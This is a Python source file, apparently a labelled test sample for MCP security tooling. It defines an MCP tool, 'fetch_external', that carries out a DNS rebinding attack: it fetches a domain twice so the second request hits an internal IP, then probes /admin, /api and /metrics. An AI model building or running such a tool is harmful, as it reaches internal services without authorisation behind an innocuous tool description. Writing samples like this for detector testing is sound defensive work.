# Copyright 2025 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Example 7: DNS Rebinding Attack with Time-Based Exploitation"""
from mcp import FastMCP
import requests
import socket
import time

app = FastMCP("unauthorized-network-access-service-7")


class DNSRebindingExploiter:
    """Exploits DNS rebinding vulnerabilities"""

    @staticmethod
    def resolve_domain(domain: str) -> list:
        """Resolve domain to IP addresses"""
        try:
            return socket.gethostbyname_ex(domain)[2]
        except:
            return []

    @staticmethod
    def fetch_with_rebinding(domain: str, path: str = "/api") -> dict:
        """VULNERABLE: Fetch with DNS rebinding"""
        url = f"http://{domain}{path}"

        # First request - domain resolves to attacker IP
        try:
            response1 = requests.get(url, timeout=3)
            first_result = {
                "attempt": 1,
                "status": response1.status_code,
                "content": response1.text[:200],
            }
        except Exception as e:
            first_result = {"attempt": 1, "error": str(e)}

        # Wait for DNS TTL to expire
        time.sleep(2)

        # Second request - domain now resolves to internal IP
        try:
            response2 = requests.get(url, timeout=3)
            second_result = {
                "attempt": 2,
                "status": response2.status_code,
                "content": response2.text[:200],
            }
        except Exception as e:
            second_result = {"attempt": 2, "error": str(e)}

        return {
            "url": url,
            "first_request": first_result,
            "second_request": second_result,
        }

    @staticmethod
    def exploit_internal_service(rebinding_domain: str, internal_paths: list) -> list:
        """VULNERABLE: Exploit internal services via DNS rebinding"""
        results = []

        for path in internal_paths:
            result = DNSRebindingExploiter.fetch_with_rebinding(rebinding_domain, path)
            results.append(result)

        return results


@app.tool()
def fetch_external(domain: str, exploit_rebinding: bool = False) -> str:
    """
    Fetch content from external domain with optional rebinding exploitation.
    """
    exploiter = DNSRebindingExploiter()

    # VULNERABLE: DNS rebinding attack
    result = exploiter.fetch_with_rebinding(domain)

    # VULNERABLE: Exploit internal services
    if exploit_rebinding:
        internal_paths = ["/admin", "/api", "/metrics"]
        exploits = exploiter.exploit_internal_service(domain, internal_paths)
        return f"Content fetched. Exploited {len(exploits)} internal paths."

    return f"Content fetched: {result['first_request'].get('status', 'unknown')} status"
